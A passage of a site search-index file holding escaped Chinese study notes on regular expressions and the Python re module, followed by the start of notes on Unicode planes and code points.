\u5728\u6574\u4e2a\u539f\u5b57\u7b26\u4e32\u4e2d\u7684\u8d77\u59cb\u4f4d\u7f6e\uff08\u5b50\u4e32\u7b2c\u4e00\u4e2a\u5b57\u7b26\u7684\u7d22\u5f15\uff09 Match.end([group])\uff1aMatch.group([group]) \u5728\u6574\u4e2a\u539f\u5b57\u7b26\u4e32\u4e2d\u7684\u7ed3\u675f\u4f4d\u7f6e\uff08\u5b50\u4e32\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\u7d22\u5f15+1\uff09 Match.span([group])\uff1a\u8fd4\u56de (Match.start([group]), Match.end([group])) Match.__gettiem__([group])\uff1a\u7b49\u540c\u4e8e .group([group]) \u989d\u5916\u8bed\u6cd5 \u00b6 (?#...)\uff1a\u6ce8\u91ca\uff0c\u76f4\u63a5\u5ffd\u7565 (?P ...)\uff1a\u4e3a\u6355\u83b7\u7ec4\u547d\u540d\u4e3a name\uff08\u5fc5\u987b\u662f\u5408\u6cd5 python \u53d8\u91cf\u540d\uff0c\u5e76\u4e14\u540c\u4e00\u4e2a pattern \u4e2d\u4e0d\u80fd\u91cd\u590d\uff09\uff0c\u540e\u9762\u53ef\u4ee5\u901a\u8fc7 name \u5f15\u7528\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7f16\u53f7\u5f15\u7528\u3002\u5728 Match.group([group]) \u7684 group \u4e2d\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 \"name\" \u6765\u83b7\u53d6\u8fd9\u4e2a\u6355\u83b7\u7ec4 (?P=name)\uff1a\u4e0e\u540d\u5b57\u4e3a name \u7684\u6355\u83b7\u7ec4\u5b8c\u5168\u76f8\u540c\u7684\u90e8\u5206\uff0c\u76f8\u5f53\u4e8e\u901a\u8fc7\u7f16\u53f7\u5f15\u7528 (?(id/name)yes-pattern|no-pattern)\uff1a\u5982\u679c\u7f16\u53f7\u4e3a id \u6216\u8005\u540d\u5b57\u4e3a name \u7684\u6355\u83b7\u7ec4\u5b58\u5728\uff0c\u5219\u6b64\u5904\u4f7f\u7528 yes-pattern\uff0c\u5426\u5219\u4f7f\u7528 no-pattern \u4f8b\u5982\uff1a (<)?(\\w+@\\w+(?:\\.\\w+)+)(?(1)>|$) \u5339\u914d '<user@host.com>' \u548c 'user@host.com' \uff0c\u4f46\u4e0d\u5339\u914d '<user@host.com' \u548c 'user@host.com>' \u6807\u8bc6\u7b26 \u00b6 \u6807\u8bc6\u7b26 \u542b\u4e49 re.I \u5ffd\u7565\u5927\u5c0f\u5199 re.L \u672c\u5730\u5316\u8bc6\u522b\u5339\u914d\uff08\u4e0d\u53ef\u9760\uff09 re.M \u591a\u884c\u5339\u914d re.S \u5355\u884c\u5339\u914d\uff0c\u4f7f . \u540c\u6837\u5339\u914d\u6362\u884c\u7b26 re.U \u4f7f\u7528 unicode\uff0c\u5f71\u54cd \\w\\W\\b\\B re.X \u4f7f\u7528 python \u4e00\u6837\u7684\u6ce8\u91ca\uff0c\u5e76\u4e14\u6709\u591a\u884c pattern \u7684\u4f18\u5316\uff0c\u4f7f\u6b63\u5219\u66f4\u6613\u8bfb \u540c\u65f6\u4f7f\u7528\u591a\u4e2a\u6807\u8bc6\u7b26\uff0c\u7528 | \u9694\u5f00\uff08\u5982 re.I | re.M \u8868\u793a\u591a\u884c\u4e14\u5ffd\u7565\u5927\u5c0f\u5199\uff09 re.X \u7684\u4f8b\u5b50 a = re . compile ( r \"\"\"\\d + # the integral part \\. # the decimal point \\d * # some fractional digits\"\"\" , re . X ) b = re . compile ( r \"\\d+\\.\\d*\" ) a b \u7b49\u4ef7","title":"\u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"cs/regex/#_1","text":"\u6b63\u5219\u8868\u8fbe\u5f0f\uff08Regular Expression\uff09\u4f7f\u7528\u5355\u4e2a\u5b57\u7b26\u4e32\u6765\u63cf\u8ff0\u3001\u5339\u914d\u4e00\u7cfb\u5217\u5339\u914d\u67d0\u4e2a\u53e5\u6cd5\u89c4\u5219\u7684\u5b57\u7b26\u4e32\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1 Abstract \u6b63\u5219\u8868\u8fbe\u5f0f\u7528\u9014\u5e7f\u6cdb\uff0c\u800c\u4e14\u529f\u80fd\u5f3a\u5927\u53c8\u597d\u7528\u3002\u53ef\u4ee5\u8bf4\u65e2\u7b80\u5355\u53c8\u7e41\u7410\uff0c\u4f46\u662f\u7528\u8d77\u6765\u5f88\u723d \u4e00\u4e9b\u5de5\u5177\uff1a RegExr \u6b63\u5219\u5728\u7ebf\u6d4b\u8bd5\u5de5\u5177 Regulex \u6b63\u5219\u8868\u8fbe\u5f0f\u53ef\u89c6\u5316 HackerRank regex \u4e60\u9898\u96c6","title":"\u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"cs/regex/#_2","text":"","title":"\u8bed\u6cd5"},{"location":"cs/regex/#_3","text":"\u6240\u6709\u4e0d\u662f\u5143\u5b57\u7b26\u7684\u5b57\u7b26\u90fd\u53ef\u4ee5\u76f4\u63a5\u5199\u51fa\u6765\u7528\u6765\u5339\u914d\uff0c\u6bd4\u5982\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7b26\u53f7\u7b49 \u6709\u8bed\u6cd5\u610f\u4e49\u7684\u5b57\u7b26\u9700\u8981\u4f7f\u7528 \u8f6c\u4e49\uff0c\u6bd4\u5982 \\( \\) \\[ \\] \\. \u5206\u522b\u5339\u914d ()[]. \u8fd9\u4e94\u4e2a\u5b57\u7b26 \u8bed\u6cd5 \u63cf\u8ff0 [...] \u5339\u914d\u4efb\u610f\u5728 ... \u4e2d\u7684\u5b57\u7b26\uff0c\u5982 [ABC] \u5339\u914d\u6240\u6709 A B C \u5b57\u7b26 [^...] \u5339\u914d\u4efb\u610f\u4e0d\u5728 ... \u4e2d\u7684\u5b57\u7b26\uff0c\u5982 [^ABC] \u5339\u914d\u9664\u4e86 A B C \u5916\u7684\u6240\u6709\u5355\u4e2a\u5b57\u7b26 [x-y] \u6309\u7167\u987a\u5e8f\u5339\u914d\u4ece x \u5230 y \u5230\u6240\u6709\u5b57\u7b26\uff0c\u5982 [a-z] \u5339\u914d\u6240\u6709\u5c0f\u5199\u5b57\u6bcd\uff0c[A-E] \u5339\u914d A \u5230 E \u8fd9\u4e94\u4e2a\u5b57\u7b26\uff5c . \u5339\u914d\u4efb\u610f\u9664\u4e86\u6362\u884c\u7b26\u4ee5\u5916\u7684\u5b57\u7b26 \\w \u5339\u914d\u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf\uff0c\u76f8\u5f53\u4e8e [a-zA-Z0-9_] x|y \u5339\u914d x \u6216 y \uff0c\u4f18\u5148\u7ea7\u6700\u4f4e\uff0c\u5982 a|bcd \u5339\u914d a \u6216 bcd","title":"\u666e\u901a\u5b57\u7b26"},{"location":"cs/regex/#_4","text":"\u8bed\u6cd5 \u63cf\u8ff0 \\cx \u5339\u914d\u7531 x \u6307\u660e\u7684\u63a7\u5236\u5b57\u7b26\uff0cx \u5fc5\u987b\u5c5e\u4e8e [a-zA-Z]\uff0c\u5426\u5219 \\c \u76f4\u63a5\u89c6\u4e3a c\uff0c\u5982 \\cM \u5339\u914d Ctrl-M \u5373\u56de\u8f66\u7b26 \\f \u5339\u914d\u4e00\u4e2a\u6362\u9875\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0c \\cL \\n \u5339\u914d\u4e00\u4e2a\u6362\u884c\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0a \\cJ \\r \u5339\u914d\u4e00\u4e2a\u56de\u8f66\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0d \\cM \\t \u5339\u914d\u4e00\u4e2a\u5236\u8868\u7b26\uff0c\u76f8\u5f53\u4e8e \\x09 \\cI \\v \u5339\u914d\u4e00\u4e2a\u5782\u76f4\u5236\u8868\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0b \\cK \\s \u5339\u914d\u4efb\u4f55\u7a7a\u767d\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e [ \\f\\n\\r\\t\\v]\uff0cunicode \u4e0b\u4e5f\u4f1a\u5339\u914d\u5168\u89d2\u7a7a\u683c\u7b26 \\S \u5339\u914d\u4efb\u4f55\u975e\u7a7a\u767d\u7b26\uff0c\u76f8\u5f53\u4e8e [^ \\f\\n\\r\\t\\v]","title":"\u975e\u6253\u5370\u5b57\u7b26"},{"location":"cs/regex/#_5","text":"\u7528\u6765\u6307\u5b9a\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u51fa\u73b0\u4e86\u591a\u5c11\u6b21 \u8bed\u6cd5 \u63cf\u8ff0 {n} \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d\u51c6\u786e\u7684 n \u6b21\uff0c\u5982 o{2} \u5339\u914d\u4e24\u4e2a\u8fde\u7eed\u7684 o {n,} \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d\u81f3\u5c11 n \u6b21\uff0c\u5982 o{2,} \u53ef\u4ee5\u5339\u914d goooood \u4e2d\u7684\u6240\u6709 o\uff0c\u4f46\u4e0d\u5339\u914d god \u4e2d\u7684 o {n,m} \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d\u81f3\u5c11 n \u6b21\uff0c\u81f3\u591a m \u6b21 * \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d 0 \u6b21\u6216\u591a\u6b21\uff0c\u76f8\u5f53\u4e8e {0,} + \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d 1 \u6b21\u6216\u591a\u6b21\uff0c\u76f8\u5f53\u4e8e {1,} ? \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u53ef\u6709\u53ef\u65e0\uff08\u5339\u914d 0 \u6b21\u6216 1 \u6b21\uff09\uff0c\u76f8\u5f53\u4e8e {0,1}","title":"\u9650\u5b9a\u7b26"},{"location":"cs/regex/#_7","text":"\u53ea\u5339\u914d\u4f4d\u7f6e\uff0c\u6ca1\u6709\u5b57\u7b26\u4e0e\u4e4b\u5bf9\u5e94 \u8bed\u6cd5 \u63cf\u8ff0 ^ \u5339\u914d\u5b57\u7b26\u4e32\u5f00\u5934\uff0c\u5982\u679c\u662f\u591a\u884c\u6a21\u5f0f\uff0c\u5219\u65b0\u7684\u4e00\u884c\u4e5f\u7b97\u65b0\u7684\u5b57\u7b26\u4e32 $ \u5339\u914d\u5b57\u7b26\u4e32\u7ed3\u5c3e\uff0c\u591a\u884c\u6a21\u5f0f\u540c\u7406\u770b\u6210\u591a\u4e2a\u5b57\u7b26\u4e32 \\b \u5339\u914d\u5355\u8bcd\u8fb9\u754c\uff0c\u5373\u5b57\u7b26\u4e0e\u7a7a\u683c\u4e2d\u95f4\u7684\u4f4d\u7f6e \\B \u5339\u914d\u975e\u5355\u8bcd\u8fb9\u754c \u5b9a\u4f4d\u7b26\u53ea\u80fd\u5355\u72ec\u4f7f\u7528\uff0c\u4e0d\u80fd\u9644\u52a0\u9650\u5236\u7b26\u6307\u5b9a\u4e2a\u6570","title":"\u5b9a\u4f4d\u7b26"},{"location":"cs/regex/#_8","text":"\u7528 () \u53ef\u4ee5\u6307\u5b9a\u5339\u914d\u4e00\u4e2a\u7ec4\uff0c\u4f7f\u7528 () \u53ef\u4ee5\u6307\u5b9a\u4e0d\u540c\u9009\u9879\uff0c\u6bcf\u4e00\u9879\u95f4\u7528 | \u5206\u9694 \u540c\u65f6 () \u4e5f\u662f\u6355\u83b7\u5206\u7ec4\uff0c\u5373\u62ec\u53f7\u5185\u5339\u914d\u7684\u5185\u5bb9\u4f1a\u88ab\u7f13\u5b58\uff0c\u5982\u679c\u8981\u907f\u514d\u8fd9\u79cd\uff0c\u9700\u8981\u4f7f\u7528 (?:) \u975e\u6355\u83b7\u5143\u6765\u8fdb\u884c\u5339\u914d","title":"\u5206\u7ec4"},{"location":"cs/regex/#_11","text":"\u4fee\u9970\u7b26\u4e0d\u5c5e\u4e8e\u8868\u8fbe\u5f0f\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u6307\u5b9a\u4e86\u5339\u914d\u7684\u89c4\u5219\uff0cjs \u4e2d\u7684\u6b63\u5219\u5199\u6cd5\u4e3a /pattern/flags \u5176\u4e2d flags \u5c31\u662f\u4fee\u9970\u7b26 \u4fee\u9970\u7b26 \u540d\u79f0 \u542b\u4e49 i ignore \u5ffd\u7565\u5927\u5c0f\u5199 g global \u5168\u5c40\u5339\u914d\uff0c\u67e5\u627e\u6240\u6709\u5339\u914d\u9879 m multi-line \u591a\u884c\u5339\u914d\uff0c\u4f7f ^$ \u5339\u914d\u6bcf\u884c\u7684\u5f00\u5934\u548c\u7ed3\u5c3e s single-line \u5355\u884c\u5339\u914d\uff0c\u53ea\u89c6\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c. \u4e5f\u53ef\u4ee5\u5339\u914d\u6362\u884c\u7b26 \u4e0d\u540c\u8bed\u8a00\u4e2d\u5199\u6cd5\u548c\u79cd\u7c7b\u4e0d\u540c","title":"\u4fee\u9970\u7b26"},{"location":"cs/regex/#_12","text":"\u6b63\u5219\u8868\u8fbe\u5f0f\u4e5f\u6709\u4f18\u5148\u7ea7\uff0c\u540c\u4e00\u4f18\u5148\u7ea7\u5219\u4ece\u5de6\u5411\u53f3\u8fd0\u7b97\uff0c\u4e0d\u540c\u4f18\u5148\u7ea7\u5219\u4ece\u9ad8\u5230\u4f4e\u3002\u4ece\u9ad8\u5230\u4f4e\uff1a \u8f6c\u4e49\u7b26 \\ \u62ec\u53f7\u7b26 (...) (?:...) (?=...) (?!...) (?<=...) (?<!...) [...] [^...] \u9650\u5b9a\u7b26 * + ? {n} {n,} {n,m} \u5b9a\u4f4d\u7b26 ^ $ \u5b57\u7b26 \u6216 |","title":"\u4f18\u5148\u7ea7"},{"location":"cs/regex/#python-re","text":"python \u7684 re \u6a21\u5757\u63d0\u4f9b\u4e86\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u76f8\u5173\u65b9\u6cd5\uff1a re.match(pattern, string, flags=0)\uff1a\u4f7f\u7528 pattern \u4ece\u5934 \u5339\u914d string\uff0cflags \u4e3a\u4fee\u9970\u7b26\u3002 \u5339\u914d\u5931\u8d25\u8fd4\u56de None\uff0c\u5339\u914d\u6210\u529f\u8fd4\u56de\u4e00\u4e2a re.Match re.search(pattern, string, flags=0)\uff1a\u4f7f\u7528 pattern \u626b\u63cf\u6574\u4e2a string\uff0c\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5339\u914d\u7684 re.Match re.sub(pattern, repl, string, count=0, flags=0)\uff1a pattern\uff1a\u8981\u88ab\u66ff\u6362\u90e8\u5206\u7684\u6b63\u5219\u8868\u8fbe\u5f0f repl\uff1a\u66ff\u6362\u7684\u5b57\u7b26\u4e32\uff0c\u6216\u8005\u66ff\u6362\u7528\u7684\u51fd\u6570 \u662f\u51fd\u6570\u65f6\u63a5\u53d7\u4e00\u4e2a re.Match\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32 string\uff1a\u539f\u5b57\u7b26\u4e32 count\uff1a\u66ff\u6362\u7684\u6700\u5927\u6b21\u6570\uff0c\u662f 0 \u65f6\u8868\u793a\u66ff\u6362\u5168\u90e8 flags\uff1a\u4fee\u9970\u7b26 re.compile(pattern, flags=0)\uff1a\u7f16\u8bd1\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8fd4\u56de\u4e00\u4e2a re.Pattern re.findall(pattern, string, flags=0)\uff1a\u5728 string \u4e2d\u67e5\u627e\u6240\u6709\u5339\u914d pattern \u7684\u7ed3\u679c\uff0c\u8fd4\u56de\u5217\u8868 re.finditer(pattern, string, flags=0)\uff1a\u5728 string \u4e2d\u67e5\u627e\u6240\u6709\u5339\u914d pattern \u7684\u90e8\u5206\uff0c\u8fd4\u56de\u8fed\u4ee3\u5668 re.split(pattern, string, maxsplit=0, flags=0)\uff1a pattern\uff1a\u8981\u4fdd\u7559\u90e8\u5206\u7684\u6b63\u5219\u8868\u8fbe\u5f0f string\uff1a\u539f\u5b57\u7b26\u4e32 maxsplit\uff1a\u5206\u9694\u6b21\u6570\uff0c\u662f 0 \u662f\u5168\u90e8\u5206\u9694 flags\uff1a\u4fee\u9970\u7b26 \u8fd4\u56de\u4e00\u4e2a\u5206\u5272\u540e\u7684\u5217\u8868 re.escape(pattern)\uff1a\u8f6c\u4e49 pattern \u4e2d\u7684\u7279\u6b8a\u5b57\u7b26","title":"Python re \u6a21\u5757"},{"location":"cs/regex/#repattern","text":"\u7528\u6cd5\u7c7b\u4f3c\u76f4\u63a5\u4f7f\u7528 re\uff0c\u53ea\u662f\u8fdb\u884c\u4e86\u9884\u7f16\u8bd1\uff0c\u5e76\u4e14\u56fa\u5b9a\u4e86 pattern \u548c flags Pattern.search(string[, pos[, endpos]]) Pattern.match(string[, pos[, endpos]]) Pattern.fullmatch(string[, pos[, endpos]]) Pattern.split(string, maxsplit=0) Pattern.findall(string[, pos[, endpos]]) Pattern.finditer(string[, pos[, endpos]]) Pattern.sub(repl, string, count=0) Pattern.pattern\uff1a\u6b63\u5219\u8868\u8fbe\u5f0f Pattern.flags\uff1a\u4fee\u9970\u7b26 Pattern.groups\uff1aint \u503c\uff0cpattern \u4e2d\u6355\u83b7\u7ec4\u7684\u4e2a\u6570 Pattern.groupindex\uff1a\u4e00\u4e2a\u5b57\u5178\uff0c\u5982\u679c pattern \u4e2d\u5305\u542b (?P<name>...) \u5219\u5305\u542b\u4e00\u4e2a\u4ece name \u6620\u5c04\u5230\u6355\u83b7\u7ec4\u7f16\u53f7\u7684\u952e\u503c\u5bf9","title":"re.Pattern"},{"location":"cs/regex/#rematch","text":"re.Match \u662f match \u548c search \u5728\u6210\u529f\u5339\u914d\u65f6\u8fd4\u56de\u7684\u7c7b\u578b Match.group([group])\uff1a\u8fd4\u56de\u5b57\u7b26\u4e32 group() \u6216 group(0) \u8fd4\u56de\u5339\u914d\u7684\u5b8c\u6574\u5b57\u7b26\u4e32 group(i) \u8fd4\u56de\u7b2c i \u4e2a\u6355\u83b7\u7ec4 Match.start([group])\uff1aMatch.group([group]) \u5728\u6574\u4e2a\u539f\u5b57\u7b26\u4e32\u4e2d\u7684\u8d77\u59cb\u4f4d\u7f6e\uff08\u5b50\u4e32\u7b2c\u4e00\u4e2a\u5b57\u7b26\u7684\u7d22\u5f15\uff09 Match.end([group])\uff1aMatch.group([group]) \u5728\u6574\u4e2a\u539f\u5b57\u7b26\u4e32\u4e2d\u7684\u7ed3\u675f\u4f4d\u7f6e\uff08\u5b50\u4e32\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\u7d22\u5f15+1\uff09 Match.span([group])\uff1a\u8fd4\u56de (Match.start([group]), Match.end([group])) Match.__gettiem__([group])\uff1a\u7b49\u540c\u4e8e .group([group])","title":"re.Match"},{"location":"cs/regex/#_13","text":"(?#...)\uff1a\u6ce8\u91ca\uff0c\u76f4\u63a5\u5ffd\u7565 (?P ...)\uff1a\u4e3a\u6355\u83b7\u7ec4\u547d\u540d\u4e3a name\uff08\u5fc5\u987b\u662f\u5408\u6cd5 python \u53d8\u91cf\u540d\uff0c\u5e76\u4e14\u540c\u4e00\u4e2a pattern \u4e2d\u4e0d\u80fd\u91cd\u590d\uff09\uff0c\u540e\u9762\u53ef\u4ee5\u901a\u8fc7 name \u5f15\u7528\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7f16\u53f7\u5f15\u7528\u3002\u5728 Match.group([group]) \u7684 group \u4e2d\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 \"name\" \u6765\u83b7\u53d6\u8fd9\u4e2a\u6355\u83b7\u7ec4 (?P=name)\uff1a\u4e0e\u540d\u5b57\u4e3a name \u7684\u6355\u83b7\u7ec4\u5b8c\u5168\u76f8\u540c\u7684\u90e8\u5206\uff0c\u76f8\u5f53\u4e8e\u901a\u8fc7\u7f16\u53f7\u5f15\u7528 (?(id/name)yes-pattern|no-pattern)\uff1a\u5982\u679c\u7f16\u53f7\u4e3a id \u6216\u8005\u540d\u5b57\u4e3a name \u7684\u6355\u83b7\u7ec4\u5b58\u5728\uff0c\u5219\u6b64\u5904\u4f7f\u7528 yes-pattern\uff0c\u5426\u5219\u4f7f\u7528 no-pattern \u4f8b\u5982\uff1a (<)?(\\w+@\\w+(?:\\.\\w+)+)(?(1)>|$) \u5339\u914d '<user@host.com>' \u548c 'user@host.com' \uff0c\u4f46\u4e0d\u5339\u914d '<user@host.com' \u548c 'user@host.com>'","title":"\u989d\u5916\u8bed\u6cd5"},{"location":"cs/regex/#_14","text":"\u6807\u8bc6\u7b26 \u542b\u4e49 re.I \u5ffd\u7565\u5927\u5c0f\u5199 re.L \u672c\u5730\u5316\u8bc6\u522b\u5339\u914d\uff08\u4e0d\u53ef\u9760\uff09 re.M \u591a\u884c\u5339\u914d re.S \u5355\u884c\u5339\u914d\uff0c\u4f7f . \u540c\u6837\u5339\u914d\u6362\u884c\u7b26 re.U \u4f7f\u7528 unicode\uff0c\u5f71\u54cd \\w\\W\\b\\B re.X \u4f7f\u7528 python \u4e00\u6837\u7684\u6ce8\u91ca\uff0c\u5e76\u4e14\u6709\u591a\u884c pattern \u7684\u4f18\u5316\uff0c\u4f7f\u6b63\u5219\u66f4\u6613\u8bfb \u540c\u65f6\u4f7f\u7528\u591a\u4e2a\u6807\u8bc6\u7b26\uff0c\u7528 | \u9694\u5f00\uff08\u5982 re.I | re.M \u8868\u793a\u591a\u884c\u4e14\u5ffd\u7565\u5927\u5c0f\u5199\uff09 re.X \u7684\u4f8b\u5b50 a = re . compile ( r \"\"\"\\d + # the integral part \\. # the decimal point \\d * # some fractional digits\"\"\" , re . X ) b = re . compile ( r \"\\d+\\.\\d*\" ) a b \u7b49\u4ef7","title":"\u6807\u8bc6\u7b26"},{"location":"cs/unicode/","text":"Unicode \u7edf\u4e00\u7801 \u00b6 Unicode\uff08\u522b\u540d Universal coded character set (UCS)\uff09\uff0c\u5b98\u65b9\u4e2d\u6587\u540d\u79f0\u4e3a\u7edf\u4e00\u7801\uff0c\u662f\u8ba1\u7b97\u673a\u79d1\u5b66\u9886\u57df\u7684\u4e1a\u754c\u6807\u51c6\u3002\u5b83\u6574\u7406\u3001\u7f16\u7801\u4e86\u4e16\u754c\u4e0a\u5927\u90e8\u5206\u7684\u6587\u5b57\u7cfb\u7edf\uff0c\u4f7f\u5f97\u7535\u8111\u53ef\u4ee5\u7528\u66f4\u4e3a\u7b80\u5355\u7684\u65b9\u5f0f\u6765\u5448\u73b0\u548c\u5904\u7406\u6587\u5b57\u3002 Unicode \u4f34\u968f\u7740\u901a\u7528\u5b57\u7b26\u96c6\u7684\u6807\u51c6\u800c\u53d1\u5c55\uff0c\u540c\u65f6\u4e5f\u4ee5\u4e66\u672c\u7684\u5f62\u5f0f\u5bf9\u5916\u53d1\u8868\u3002Unicode \u81f3\u4eca\u4ecd\u5728\u4e0d\u65ad\u589e\u4fee\uff0c\u6bcf\u4e2a\u65b0\u7248\u672c\u90fd\u52a0\u5165\u66f4\u591a\u65b0\u7684\u5b57\u7b26\u3002\u76ee\u524d\u6700\u65b0\u7684\u7248\u672c\u4e3a 2021 \u5e74 9 \u6708\u516c\u5e03\u7684 14.0.0\uff0c\u5df2\u7ecf\u6536\u5f55\u8d85\u8fc714\u4e07\u4e2a\u5b57\u7b26\uff08\u7b2c\u5341\u4e07\u4e2a\u5b57\u7b26\u5728 2005 \u5e74\u83b7\u91c7\u7eb3\uff09\u3002Unicode \u9664\u4e86\u89c6\u89c9\u4e0a\u7684\u5b57\u5f62\u3001\u7f16\u7801\u65b9\u6cd5\u3001\u6807\u51c6\u7684\u5b57\u7b26\u7f16\u7801\u8d44\u6599\u5916\uff0c\u8fd8\u5305\u542b\u4e86\u5b57\u7b26\u7279\u6027\uff08\u5982\u5927\u5c0f\u5199\u5b57\u6bcd\uff09\u3001\u4e66\u5199\u65b9\u5411\u3001\u62c6\u5206\u6807\u51c6\u7b49\u7279\u6027\u7684\u8d44\u6599\u5e93\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1 Abstract \u4e00\u76f4\u89c9\u5f97 Unicode \u548c UTF-8 \u7f16\u7801\u5f88\u6709\u610f\u601d\uff0c\u5c31\u770b\u4e86\u770b Unicode \u5b98\u7f51 Unicode \u5b57\u7b26\u767e\u79d1\uff08\u4e2d\u6587\uff09 Unicode \u6807\u51c6\uff1aISO/IEC 10646:2020 ISO/IEC 10646:2020 \u5b98\u65b9\u5f00\u653e\u4e0b\u8f7d\u5730\u5740 Unicode \u5b57\u7b26\u96c6 \u00b6 Unicode \u7684\u5b57\u7b26\u96c6\u4ee5\u5206\u7ec4\u7684\u5f62\u5f0f\u8fdb\u884c\u7f16\u6392\uff0c\u6574\u4f53\u5206\u4e3a 17 \u4e2a\u5e73\u9762\uff08Plane\uff09 \u6bcf\u4e2a\u5e73\u9762\u4e2d\u6709 \\(2^{16}\\) \u4e2a\u7801\u4f4d\uff08codepoint\uff09\uff0c\u5373\u53ef\u4ee5\u5305\u542b 65536 \u4e2a\u5b57\u7b26\uff0c\u6574\u4f53\u6700\u591a\u53ef\u4ee5\u5305\u542b 111w+ \u4e2a\u5b57\u7b26\uff0c\u4f46\u76ee\u524d\u53ea\u4f7f\u7528\u4e86\u5c11\u6570\u5e73\u9762\u5171 14w+ \u4e2a\u5b57\u7b26 Unicode \u5b57\u7b26\u96c6\u4e2d\u6bcf\u4e2a\u5b57\u7b26\u90fd\u6709\u4e00\u4e2a\u7f16\u53f7\uff0c\u5373\u5b57\u7b26\u503c\u3002\u5316\u4e3a\u5341\u516d\u8fdb\u5236\u540e\u540e\u56db\u4f4d\u4e3a\u5728\u5f53\u524d\u5e73\u9762\u4e0a\u7684\u7801\u503c\uff0c\u524d\u9762\u5269\u4f59\u7684\u4e3a\u5e73\u9762\u7f16\u53f7 \u6bd4\u5982 \"\u9e64\" \u8fd9\u4e2a\u5b57\u7b26\u7684\u5b57\u7b26\u503c\u662f 0x9E64\uff0c\u8868\u793a\u4e3a U+9E64 \u5b57\u7b26\u5e73\u9762\u6620\u5c04 \u00b6 \u5e73\u9762\u7f16\u53f7 \u5b57\u7b26\u503c\u8303\u56f4 \u540d\u79f0 0 U+0000 ~ U+FFFF BMP \uff08Basic Multilingual Plane\uff09\u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762 1 U+10000 ~ U+1FFFF SMP \uff08Supplementary Multilingual Plane\uff09\u591a\u6587\u79cd\u8865\u5145\u5e73\u9762 2 U+20000 ~ U+2FFFF SIP \uff08Supplementary Ideographic Plane\uff09\u8868\u610f\u6587\u5b57\u8865\u5145\u5e73\u9762 3 U+30000 ~ U+3FFFF TIP \uff08Tertiary Ideographic Plane\uff09\u8868\u610f\u6587\u5b57\u7b2c\u4e09\u5e73\u9762 4~13 U+40000 ~ U+DFFFF Reserved Planes \u5c1a\u672a\u4f7f\u7528 14 U+E0000 ~ U+EFFFF SSP \uff08Supplementary Special-purpose Plane\uff09\u7279\u522b\u7528\u9014\u8865\u5145\u5e73\u9762 15 U+F0000 ~ U+FFFFF PUA-A \uff08Private Use Area-A\uff09\u79c1\u4eba\u4f7f\u7528\u533a A \u533a 16 U+100000 ~ U+10FFFF PUA-B \uff08Private Use Area-B\uff09\u79c1\u4eba\u4f7f\u7528\u533a B \u533a BMP \u5e73\u9762\uff08\u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762\uff09 \u8be6\u89c1\uff1a Unicode \u5b57\u7b26\u767e\u79d1 \u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762 - \u7ef4\u57fa\u767e\u79d1 SMP \u5e73\u9762\uff08\u7b2c\u4e00\u8f85\u52a9\u5e73\u9762\uff09 \u4e3b\u8981\u6446\u653e\u7edd\u5927\u591a\u6570\u53e4\u4ee3\u6587\u5b57\uff0c\u73b0\u65f6\u5df2\u4e0d\u518d\u4f7f\u7528\u6216\u5f88\u5c11\u4f7f\u7528\u6587\u5b57\u3001\u901f\u8bb0\u3001\u6570\u5b66\u5b57\u6bcd\u7b26\u53f7\u3001\u97f3\u7b26\u3001\u56fe\u5f62\u7b26\u53f7\u53ca\u7528\u4e8e\u5b66\u8005\u7684\u4e13\u4e1a\u8bba\u6587\u4e2d\u4f7f\u7528\u7684\u53e4\u8001\u6216\u8fc7\u65f6\u7684\u8bed\u8a00\u4e66\u5199\u7b26\u53f7\uff0c\u4ee5\u53ca emoji \u8be6\u89c1\uff1a Unicode \u5b57\u7b26\u767e\u79d1 \u7b2c\u4e00\u8f85\u52a9\u5e73\u9762 - \u7ef4\u57fa\u767e\u79d1 SIP \u5e73\u9762\uff08\u7b2c\u4e8c\u8f85\u52a9\u5e73\u9762\uff09 \u5168\u4e3a CJK \u5b57\u7b26\uff0c\u5305\u542b\u5c11\u7528\u7684\u6c49\u5b57\u4ee5\u53ca\u67d0\u4e9b\u65b9\u8a00\u6587\u5b57 U+20000 ~ U+2A6DF\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55B\u533a\uff08CJK Unified Ideographs Extension B\uff0943253 \u4e2a\u6c49\u5b57 U+2A700 ~ U+2B73F\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55C\u533a\uff08CJK Unified Ideographs Extension C\uff094149 \u4e2a\u6c49\u5b57 U+2B740 ~ 